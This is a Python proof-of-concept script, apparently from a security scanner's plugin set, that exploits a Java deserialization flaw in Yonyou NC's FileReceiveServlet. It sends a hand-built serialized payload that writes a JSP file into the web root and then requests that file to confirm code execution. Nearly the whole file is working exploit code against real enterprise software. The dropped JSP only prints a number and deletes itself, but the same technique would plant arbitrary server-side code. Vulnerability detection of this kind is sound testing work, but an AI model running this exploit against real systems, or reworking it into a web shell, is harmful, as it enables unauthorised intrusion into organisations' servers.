'''
Function:
    yonyounc_deserialization2
Author:
    spmonkey，夜梓月
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import random
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            "Referer": "https://google.com",
            "Content-Type": "multipart/form-data;"
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def vuln(self, netloc, scheme):
        url = "{}://{}/servlet/FileReceiveServlet".format(scheme, netloc)
        Random_number = random.randint(1000, 2000)
        data = "\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x02\\x74\\x00\\x09\\x46\\x49\\x4c\\x45\\x5f\\x4e\\x41\\x4d\\x45\\x74\\x00\\x09\\x74\\x30\\x30\\x6c\\x73\\x2e\\x6a\\x73\\x70\\x74\\x00\\x10\\x54\\x41\\x52\\x47\\x45\\x54\\x5f\\x46\\x49\\x4c\\x45\\x5f\\x50\\x41\\x54\\x48\\x74\\x00\\x10\\x2e\\x2f\\x77\\x65\\x62\\x61\\x70\\x70\\x73\\x2f\\x6e\\x63\\x5f\\x77\\x65\\x62\\x78<%out.print(\"{}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>".format(Random_number)

        try:
            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            req = requests.get("{}://{}/t00ls.jsp".format(scheme, netloc), headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if req.status_code == 200 and str(Random_number) in req.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在反序列化漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n\n                 {}".format(data)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False